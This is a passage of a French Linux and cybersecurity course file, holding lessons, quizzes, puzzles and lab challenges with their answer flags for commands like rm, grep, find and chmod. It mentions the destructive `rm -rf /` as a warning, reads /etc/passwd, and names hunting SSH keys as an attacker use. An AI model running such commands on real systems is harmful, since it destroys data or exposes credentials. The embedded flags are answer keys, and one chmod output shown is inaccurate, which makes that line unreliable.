            "text": "rename --force ancien.txt nouveau.txt",
            "isCorrect": false,
            "debrief": "Faux. La commande universelle de base est mv."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cp notes.txt notes_backup.txt' puis vérifie la création avec 'ls'. Soumets le nom exact du fichier de sauvegarde !",
      "flag": "notes_backup.txt"
    }
  },
  {
    "id": "m1-l8",
    "unitId": "m1",
    "title": "8. Supprimer en Sécurité : rm et rm -r",
    "icon": "🗑️",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Supprimer Définitivement : rm",
        "bullets": [
          "`rm` signifie **Remove** (supprimer).",
          "ATTENTION : dans un terminal Linux, **il n'y a pas de corbeille** !",
          "Quand tu supprimes un fichier avec `rm`, il est effacé immédiatement et définitivement sans confirmation."
        ]
      },
      {
        "title": "Supprimer des Dossiers : rm -r",
        "bullets": [
          "Si tu tentes de supprimer un dossier avec un simple `rm`, Linux refusera en disant : *Is a directory*.",
          "Pour supprimer un répertoire et tout son contenu (fichiers et sous-dossiers), on doit ajouter l'option récursive `-r` : `rm -r nom_du_dossier`.",
          "Ne tape JAMAIS `rm -rf /` : cela détruirait l'intégralité du système d'exploitation !"
        ],
        "syntaxBox": {
          "command": "rm notes_backup.txt",
          "description": "Supprime définitivement le fichier sans passer par une corbeille.",
          "example": "Fichier supprimé."
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"50\" y=\"30\" width=\"120\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"110\" y=\"55\" fill=\"#f87171\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">rm fichier</text>\n          <text x=\"110\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Pas de corbeille !</text>\n          <line x1=\"180\" y1=\"60\" x2=\"220\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <circle cx=\"280\" cy=\"60\" r=\"30\" fill=\"#030712\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"280\" y=\"65\" fill=\"#f43f5e\" font-size=\"20\" text-anchor=\"middle\">💥</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Supprime le fichier temporaire de sauvegarde :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ rm notes_backup.txt",
            "isCritical": true,
            "note": "rm supprime le fichier de manière irréversible"
          },
          {
            "num": 3,
            "text": "operator@cyberlab:~$ ls notes_backup.txt"
          },
          {
            "num": 4,
            "text": "ls: cannot access 'notes_backup.txt': No such file or directory"
          }
        ],
        "prompt": "Clique sur la commande qui détruit le fichier de sauvegarde :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour effacer le fichier notes_backup.txt :",
        "tokens": [
          "rm",
          "notes_backup.txt",
          "touch",
          "ls"
        ],
        "correctOrder": [
          "rm",
          "notes_backup.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Que se passe-t-il lorsqu'on exécute la commande 'rm' sur un fichier dans un terminal Linux ?",
        "options": [
          {
            "text": "Le système demande une confirmation par mot de passe avant d'agir.",
            "isCorrect": false,
            "debrief": "Faux. rm s'exécute immédiatement sans mot de passe si les permissions le permettent."
          },
          {
            "text": "Le fichier est déplacé dans /tmp/trash pour une durée de 30 jours.",
            "isCorrect": false,
            "debrief": "Faux. Linux ne fournit pas de corbeille automatique en CLI."
          },
          {
            "text": "Le fichier est renommé en .bak et reste accessible.",
            "isCorrect": false,
            "debrief": "Faux. rm supprime le lien de l'inode immédiatement."
          },
          {
            "text": "Le fichier est effacé définitivement du disque sans être déplacé dans une corbeille.",
            "isCorrect": true,
            "debrief": "Exactement. Il n'existe pas de Corbeille en ligne de commande pure."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, supprime le fichier notes_backup.txt en tapant 'rm notes_backup.txt'. Soumets la commande de suppression utilisée !",
      "flag": "rm"
    }
  },
  {
    "id": "m1-l9",
    "unitId": "m1",
    "title": "9. Afficher et Lire des Fichiers : cat & head",
    "icon": "📖",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Afficher Tout le Fichier : cat",
        "bullets": [
          "`cat` signifie **Concatenate** (concaténer). C'est la commande la plus employée pour afficher le contenu d'un fichier texte directement dans le terminal.",
          "Exemple : `cat notes.txt` déverse immédiatement le texte du fichier sur ton écran.",
          "Attention : sur un fichier géant de 10 000 lignes, `cat` ferait défiler l'écran à toute vitesse de manière illisible !"
        ]
      },
      {
        "title": "Lire Seulement le Début : head",
        "bullets": [
          "Pour inspecter les premières lignes d'un fichier sans être inondé, on utilise la commande `head` (la tête).",
          "Par défaut, `head notes.txt` affiche les 10 premières lignes.",
          "Avec l'option `-n`, tu choisis précisément le nombre de lignes : `head -n 2 notes.txt` n'affiche que les 2 premières lignes."
        ],
        "syntaxBox": {
          "command": "cat notes.txt",
          "description": "Affiche l'intégralité du contenu du fichier dans la console.",
          "example": "BIENVENUE DANS TON LAB CYBER..."
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"25\" width=\"110\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"85\" y=\"55\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">cat file</text>\n          <text x=\"85\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Tout afficher</text>\n          <line x1=\"150\" y1=\"60\" x2=\"220\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <rect x=\"230\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"300\" y=\"55\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">head -n 5 file</text>\n          <text x=\"300\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">5 premières lignes</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ cat notes.txt",
            "isCritical": true,
            "note": "cat lit et déverse tout le contenu du fichier dans le terminal"
          },
          {
            "num": 2,
            "text": "BIENVENUE DANS TON LAB CYBER :"
          },
          {
            "num": 3,
            "text": "- Le terminal est ton outil n°1."
          }
        ],
        "prompt": "Clique sur la commande qui lit et affiche le contenu de notes.txt :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande pour afficher le fichier notes.txt :",
        "tokens": [
          "cat",
          "notes.txt",
          "head",
          "rm"
        ],
        "correctOrder": [
          "cat",
          "notes.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle commande permet d'afficher spécifiquement les 5 premières lignes d'un fichier volumineux ?",
        "options": [
          {
            "text": "top -n 5 fichier.txt",
            "isCorrect": false,
            "debrief": "Faux. top sert à surveiller les processus processeur."
          },
          {
            "text": "cat --first 5 fichier.txt",
            "isCorrect": false,
            "debrief": "Faux. cat n'a pas d'option --first."
          },
          {
            "text": "head -n 5 fichier.txt (affiche la 'tête' du document).",
            "isCorrect": true,
            "debrief": "Exact ! Et pour afficher la fin du fichier, on utilise son équivalent 'tail'."
          },
          {
            "text": "tail -n 5 fichier.txt",
            "isCorrect": false,
            "debrief": "Faux. tail affiche la fin (la queue) du fichier."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cat notes.txt' pour lire le contenu. Soumets la toute première phrase en majuscules du fichier !",
      "flag": "BIENVENUE DANS TON LAB CYBER"
    }
  },
  {
    "id": "m1-mid",
    "unitId": "m1",
    "title": "ÉVALUATION MI-PARCOURS : INVESTIGATION FORENSIC SYSTÈME",
    "icon": "🛡️",
    "isCheckpoint": true,
    "xp": 75,
    "lessonSlides": [
      {
        "title": "ALERTE INCIDENT : Intrusion Détectée sur la Station",
        "bullets": [
          "Une alerte SOC prioritaire signale qu'une session anormale a été ouverte sur le serveur.",
          "L'intrus a déposé un artefact médico-légal dans l'arborescence des journaux (`/var/log/incident`) avant de tenter d'effacer ses traces.",
          "Cette épreuve récapitule toutes tes compétences fondamentales : repérage, navigation dans l'arborescence, révélation des fichiers cachés et lecture de documents bruts."
        ]
      },
      {
        "title": "Objectifs de la Mission Forensic (Sans Guidage)",
        "bullets": [
          "1. Explore le répertoire d'incident (`/var/log/incident`) avec les commandes de navigation.",
          "2. Révèle l'intégralité du contenu, notamment les artefacts cachés débutant par un point (`.`).",
          "3. Examine les pièces à conviction avec `cat` et isole le token de compromission officiel !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 500 130\" class=\"w-full h-full\">\n          <rect width=\"500\" height=\"130\" rx=\"12\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <circle cx=\"65\" cy=\"65\" r=\"32\" fill=\"#f59e0b\" fill-opacity=\"0.15\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"74\" fill=\"#f59e0b\" font-size=\"28\" text-anchor=\"middle\">🛡️</text>\n          <text x=\"120\" y=\"45\" fill=\"#f8fafc\" font-size=\"14\" font-family=\"monospace\" font-weight=\"bold\">CHECKPOINT FORENSIC MI-PARCOURS</text>\n          <text x=\"120\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">Périmètre : /var/log/incident // Artefacts Furtifs</text>\n          <rect x=\"120\" y=\"85\" width=\"350\" height=\"26\" rx=\"6\" fill=\"#1e293b\" stroke=\"#334155\"/>\n          <text x=\"130\" y=\"102\" fill=\"#f59e0b\" font-size=\"11\" font-family=\"monospace\">Défi réel : Pas d'assistance pas-à-pas</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Audit forensic : inspection des artefacts d'intrusion"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ cd /var/log/incident && ls -la",
            "isCritical": true,
            "note": "ls -la est indispensable pour révéler les fichiers cachés d'une intrusion"
          },
          {
            "num": 3,
            "text": "-rw-r--r-- 1 root root 148 Oct 27 10:14 .forensic_case"
          }
        ],
        "prompt": "Clique sur la ligne indispensable pour révéler les preuves dissimulées sous forme de fichiers cachés :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue la commande complète pour lister les fichiers cachés du dossier d'incident :",
        "tokens": [
          "ls",
          "-la",
          "/var/log/incident",
          "whoami"
        ],
        "correctOrder": [
          "ls",
          "-la",
          "/var/log/incident"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi un simple 'ls' ne suffit-il pas pour une investigation forensic d'incident ?",
        "options": [
          {
            "text": "Parce que 'ls' exige impérativement les privilèges de l'administrateur root.",
            "isCorrect": false,
            "debrief": "Faux. N'importe quel utilisateur standard peut exécuter ls."
          },
          {
            "text": "Parce que 'ls' chiffre immédiatement le disque dur de la machine analysée.",
            "isCorrect": false,
            "debrief": "Faux. ls n'altère absolument rien."
          },
          {
            "text": "Parce que 'ls' supprime automatiquement tous les journaux système de plus de 24 heures.",
            "isCorrect": false,
            "debrief": "Faux. ls est une commande strictement en lecture seule."
          },
          {
            "text": "Parce que 'ls' classique ignore les fichiers débutant par un point (.), souvent utilisés pour cacher des traces.",
            "isCorrect": true,
            "debrief": "Exactement ! L'option -a (all) est obligatoire pour révéler les preuves cachées."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "ALERTE INCIDENT : Explore le dossier /var/log/incident. Révèle les fichiers cachés, lis la pièce à conviction médico-légale et soumets le FLAG de compromission !",
      "flag": "CYBER{LINUX_MID_EVAL_FORENSIC_MASTERED}"
    }
  },
  {
    "id": "m1-l10",
    "unitId": "m1",
    "title": "10. Compter les Lignes et Mots avec wc",
    "icon": "📊",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Compter le Contenu : La Commande wc",
        "bullets": [
          "`wc` signifie **Word Count** (compteur de mots).",
          "Cette commande permet de mesurer la taille exacte d'un texte ou d'une sortie en quelques fractions de seconde.",
          "Sans option, `wc notes.txt` renvoie 3 chiffres : le nombre de lignes, le nombre de mots et le nombre d'octets."
        ]
      },
      {
        "title": "L'Option Indispensable : wc -l",
        "bullets": [
          "En cybersécurité, on veut presque toujours compter le **nombre de lignes** (ex: combien de comptes utilisateurs existent, combien de lignes de logs ont été enregistrées).",
          "On utilise donc systématiquement l'option `-l` (lines) : `wc -l /etc/passwd`.",
          "Cela te donne immédiatement le total exact sans encombrer ton écran."
        ],
        "syntaxBox": {
          "command": "wc -l notes.txt",
          "description": "Compte le nombre total de lignes dans le fichier.",
          "example": "3 notes.txt"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"140\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"100\" y=\"55\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">wc -l file</text>\n          <text x=\"100\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Compter les lignes</text>\n          <line x1=\"180\" y1=\"60\" x2=\"240\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <circle cx=\"280\" cy=\"60\" r=\"30\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"280\" y=\"66\" fill=\"#34d399\" font-size=\"16\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">3</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ wc -l notes.txt",
            "isCritical": true,
            "note": "L'option -l compte les lignes contenues dans le fichier"
          },
          {
            "num": 2,
            "text": "3 notes.txt"
          }
        ],
        "prompt": "Clique sur la commande qui compte les lignes dans notes.txt :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour compter le nombre de lignes dans notes.txt :",
        "tokens": [
          "wc",
          "-l",
          "notes.txt",
          "head"
        ],
        "correctOrder": [
          "wc",
          "-l",
          "notes.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle option de la commande 'wc' demande spécifiquement le comptage des lignes ?",
        "options": [
          {
            "text": "-w (pour words / mots).",
            "isCorrect": false,
            "debrief": "Faux. -w compte les mots et non les lignes."
          },
          {
            "text": "-f (pour files / fichiers).",
            "isCorrect": false,
            "debrief": "Faux. Cette option n'existe pas pour compter les lignes."
          },
          {
            "text": "-l (pour lines / lignes).",
            "isCorrect": true,
            "debrief": "Exact ! -l permet de compter le nombre de retours à la ligne."
          },
          {
            "text": "-c (pour characters / caractères).",
            "isCorrect": false,
            "debrief": "Faux. -c compte les octets/caractères."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'wc -l notes.txt' pour compter le nombre de lignes du fichier. Soumets le chiffre obtenu !",
      "flag": "3"
    }
  },
  {
    "id": "m1-l11",
    "unitId": "m1",
    "title": "11. Redirections & Le Tube Magique : Le Pipe (|)",
    "icon": "⚡",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Philosophie Linux : Des Outils Spécialisés",
        "bullets": [
          "Sous Linux, aucun outil ne fait tout à la fois : chaque commande fait une seule chose, mais elle le fait à la perfection.",
          "La véritable puissance d'un hacker réside dans sa capacité à **connecter** ces outils entre eux comme des blocs de Lego.",
          "C'est le rôle du symbole **Pipe** noté `|` (barre verticale, obtenue avec AltGr + 6 sur Windows)."
        ]
      },
      {
        "title": "Comment Fonctionne le Pipe (|)",
        "bullets": [
          "Le symbole `|` prend la sortie texte de la commande située à sa gauche et l'injecte directement en entrée de la commande située à sa droite.",
          "Exemple : `cat /etc/passwd | head -n 1`.",
          "`cat` lit tout le fichier `/etc/passwd`, mais au lieu de l'afficher à l'écran, le Pipe le transmet à `head -n 1` qui ne retient que la première ligne !"
        ],
        "syntaxBox": {
          "command": "cat /etc/passwd | head -n 1",
          "description": "Transmet la lecture de /etc/passwd à head pour n'afficher que la première ligne.",
          "example": "root:x:0:0:root:/root:/bin/bash"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"30\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"75\" y=\"65\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">cat /etc/passwd</text>\n          <rect x=\"150\" y=\"45\" width=\"40\" height=\"30\" rx=\"4\" fill=\"#f59e0b\"/>\n          <text x=\"170\" y=\"65\" fill=\"#000\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">|</text>\n          <rect x=\"210\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"260\" y=\"65\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">head -n 1</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Chaîne deux commandes avec le pipe | :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ cat /etc/passwd | head -n 1",
            "isCritical": true,
            "note": "Le pipe redirige la sortie de cat vers l'entrée de head"
          },
          {
            "num": 3,
            "text": "root:x:0:0:root:/root:/bin/bash"
          }
        ],
        "prompt": "Clique sur la ligne contenant la chaîne de commandes unies par le pipe | :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble la commande chaînée pour lire /etc/passwd et n'en garder que la 1ère ligne :",
        "tokens": [
          "cat /etc/passwd",
          "|",
          "head -n 1",
          "rm"
        ],
        "correctOrder": [
          "cat /etc/passwd",
          "|",
          "head -n 1"
        ]
      },
      "quickQuiz": {
        "prompt": "Que fait le caractère Pipe '|' dans une ligne de commande Linux ?",
        "options": [
          {
            "text": "Il supprime automatiquement les erreurs et redémarre le terminal.",
            "isCorrect": false,
            "debrief": "Faux. Pour ignorer les erreurs, on redirige avec 2>/dev/null."
          },
          {
            "text": "Il envoie la sortie texte de la commande de gauche directement en entrée de celle de droite.",
            "isCorrect": true,
            "debrief": "Exact ! C'est le principe fondamental de la tuyauterie sous UNIX."
          },
          {
            "text": "Il chiffre la commande avec une clé symétrique AES.",
            "isCorrect": false,
            "debrief": "Faux. Il n'a rien à voir avec le chiffrement."
          },
          {
            "text": "Il met l'ordinateur en veille prolongée jusqu'à la prochaine touche.",
            "isCorrect": false,
            "debrief": "Faux. Le pipe est un mécanisme de flux inter-processus."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cat /etc/passwd | head -n 1'. Soumets la ligne complète décrivant le compte root !",
      "flag": "root:x:0:0:root:/root:/bin/bash"
    }
  },
  {
    "id": "m1-l12",
    "unitId": "m1",
    "title": "12. Chercher des Aiguilles avec grep",
    "icon": "🔍",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "L'Outil de Recherche Ultime : grep",
        "bullets": [
          "Imagine un fichier journal de 500 000 lignes : comment retrouver l'adresse IP d'un pirate ou un mot de passe en quelques secondes ?",
          "`grep` parcourt un texte ligne par ligne et n'affiche que les lignes contenant le mot-clé recherché.",
          "Syntaxe de base : `grep 'mot_cherche' fichier`."
        ]
      },
      {
        "title": "Les Options Puissantes de grep",
        "bullets": [
          "`grep -i` : insensible à la casse (trouve 'Admin', 'admin' ou 'ADMIN').",
          "`grep -v` : inverse le filtre (affiche tout **sauf** les lignes qui contiennent le mot).",
          "`grep -r 'mot' /dossier` : recherche récursivement dans tous les fichiers du dossier et de ses sous-dossiers !"
        ],
        "syntaxBox": {
          "command": "grep operator /etc/passwd",
          "description": "Extrait uniquement la ligne concernant le compte operator dans /etc/passwd.",
          "example": "operator:x:1001:1001:Apprenant Cyber:/home/operator:/bin/bash"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"130\" height=\"80\" rx=\"8\" fill=\"#0f172a\" stroke=\"#475569\"/>\n          <text x=\"30\" y=\"45\" fill=\"#64748b\" font-size=\"9\" font-family=\"monospace\">root:x:0:0...</text>\n          <text x=\"30\" y=\"65\" fill=\"#f59e0b\" font-size=\"9\" font-family=\"monospace\">operator:x:1001...</text>\n          <text x=\"30\" y=\"85\" fill=\"#64748b\" font-size=\"9\" font-family=\"monospace\">daemon:x:1:1...</text>\n          <line x1=\"160\" y1=\"60\" x2=\"220\" y2=\"60\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"190\" y=\"50\" fill=\"#38bdf8\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">grep operator</text>\n          <rect x=\"230\" y=\"35\" width=\"150\" height=\"50\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"240\" y=\"65\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\">operator:x:1001...</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Filtre le fichier /etc/passwd pour ne garder qu'operator :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ grep operator /etc/passwd",
            "isCritical": true,
            "note": "grep extrait uniquement les lignes concordantes"
          },
          {
            "num": 3,
            "text": "operator:x:1001:1001:Apprenant Cyber:/home/operator:/bin/bash"
          }
        ],
        "prompt": "Clique sur la commande qui filtre le fichier avec grep :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande grep pour chercher 'operator' dans /etc/passwd :",
        "tokens": [
          "grep",
          "operator",
          "/etc/passwd",
          "cat"
        ],
        "correctOrder": [
          "grep",
          "operator",
          "/etc/passwd"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle option permet à grep de chercher un mot sans tenir compte des majuscules et minuscules ?",
        "options": [
          {
            "text": "-c (Comptage des lignes).",
            "isCorrect": false,
            "debrief": "Faux. -c compte les occurrences."
          },
          {
            "text": "-v (Inversion de sélection).",
            "isCorrect": false,
            "debrief": "Faux. -v inverse le filtre pour exclure les lignes."
          },
          {
            "text": "-i (Ignore case / insensible à la casse).",
            "isCorrect": true,
            "debrief": "Exact ! -i permet de trouver le mot quelle que soit sa graphie."
          },
          {
            "text": "-l (Affichage des noms de fichiers).",
            "isCorrect": false,
            "debrief": "Faux. -l n'affiche que les noms de fichiers."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, filtre /etc/passwd avec la commande 'grep operator /etc/passwd'. Soumets les identifiants UID:GID affichés (ex: 1001:1001) !",
      "flag": "1001:1001"
    }
  },
  {
    "id": "m1-l13",
    "unitId": "m1",
    "title": "13. Chasser des Fichiers avec find",
    "icon": "🎯",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Recherche dans tout le Disque : find",
        "bullets": [
          "Si `ls` permet de voir les fichiers du dossier courant, `find` permet de chercher dans des millions de sous-dossiers sur l'ensemble de la machine.",
          "La syntaxe est : `find [où_chercher] [critères]`.",
          "Exemple : `find /home/operator -name '*.txt'` recherche tous les fichiers se terminant par `.txt` dans ton répertoire."
        ]
      },
      {
        "title": "Filtrer par Type : -type f",
        "bullets": [
          "Pour préciser que tu cherches uniquement un **fichier** et non un dossier, on ajoute `-type f` (f pour file).",
          "Pour chercher un dossier, on utilise `-type d` (d pour directory).",
          "C'est l'outil numéro 1 des attaquants pour dénicher des sauvegardes oubliées, des fichiers de configuration ou des clés privées SSH."
        ],
        "syntaxBox": {
          "command": "find /home/operator -name '*.txt'",
          "description": "Recherche récursivement tous les fichiers avec l'extension .txt.",
          "example": "/home/operator/notes.txt  /home/operator/projet_secret/flag_novice.txt"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <circle cx=\"50\" cy=\"60\" r=\"25\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"50\" y=\"65\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">find</text>\n          <line x1=\"80\" y1=\"60\" x2=\"140\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <rect x=\"150\" y=\"35\" width=\"220\" height=\"50\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"160\" y=\"55\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\">/home/operator/notes.txt</text>\n          <text x=\"160\" y=\"73\" fill=\"#38bdf8\" font-size=\"10\" font-family=\"monospace\">.../projet_secret/flag_novice.txt</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Cherche tous les fichiers .txt dans l'arborescence personnelle :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ find /home/operator -name '*.txt'",
            "isCritical": true,
            "note": "find parcourt tous les sous-dossiers récursivement"
          },
          {
            "num": 3,
            "text": "/home/operator/notes.txt"
          },
          {
            "num": 4,
            "text": "/home/operator/projet_secret/flag_novice.txt"
          }
        ],
        "prompt": "Clique sur la commande find qui recherche les fichiers .txt :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande find pour chercher récursivement '*.txt' :",
        "tokens": [
          "find",
          "/home/operator",
          "-name '*.txt'",
          "grep"
        ],
        "correctOrder": [
          "find",
          "/home/operator",
          "-name '*.txt'"
        ]
      },
      "quickQuiz": {
        "prompt": "À quoi sert le critère '-type f' dans une commande find sous Linux ?",
        "options": [
          {
            "text": "À chercher des fichiers contenant la lettre 'f'.",
            "isCorrect": false,
            "debrief": "Faux. Le nom se spécifie avec -name."
          },
          {
            "text": "À limiter la recherche uniquement aux fichiers réguliers (exclut les répertoires).",
            "isCorrect": true,
            "debrief": "Exact ! 'f' correspond à file et 'd' à directory."
          },
          {
            "text": "À forcer la recherche en écrasant les fichiers trouvés.",
            "isCorrect": false,
            "debrief": "Faux. find ne détruit ni n'écrase rien."
          },
          {
            "text": "À formater le disque dur cible en cas d'erreur.",
            "isCorrect": false,
            "debrief": "Faux. find n'effectue aucun formatage."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'find /home/operator -name \"*.txt\"'. Repère le fichier de flag dissimulé dans projet_secret et soumets son nom exact !",
      "flag": "flag_novice.txt"
    }
  },
  {
    "id": "m1-l14",
    "unitId": "m1",
    "title": "14. Permissions Linux & chmod",
    "icon": "🔒",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Le Modèle de Sécurité Linux : rwx",
        "bullets": [
          "Sous Linux, chaque fichier possède des droits d'accès stricts répartis en trois catégories : le Propriétaire (**User**), le Groupe (**Group**) et les Autres (**Others**).",
          "Chaque catégorie possède 3 permissions élémentaires :",
          "• `r` (**Read** / Lecture = 4 en octal)",
          "• `w` (**Write** / Écriture = 2 en octal)",
          "• `x` (**Execute** / Exécution = 1 en octal)"
        ]
      },
      {
        "title": "Modifier les Droits : La Commande chmod",
        "bullets": [
          "`chmod` signifie **Change Mode**.",
          "Pour rendre un script exécutable par son propriétaire, on tape simplement : `chmod +x script.sh`.",
          "En mode octal, `chmod 755 script.sh` donne tous les droits (7 = 4+2+1) au propriétaire, et lecture/exécution (5 = 4+1) au reste du monde."
        ],
        "syntaxBox": {
          "command": "chmod +x /opt/maintenance/cleanup.sh",
          "description": "Ajoute le droit d'exécution (+x) sur le script de maintenance.",
          "example": "-rwxrwxrwx 1 root root cleanup.sh"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"75\" y=\"55\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">r w x</text>\n          <text x=\"75\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Propriétaire (4+2+1=7)</text>\n          <rect x=\"150\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#60a5fa\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">r - x</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Groupe (4+0+1=5)</text>\n          <rect x=\"275\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"325\" y=\"55\" fill=\"#fbbf24\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" 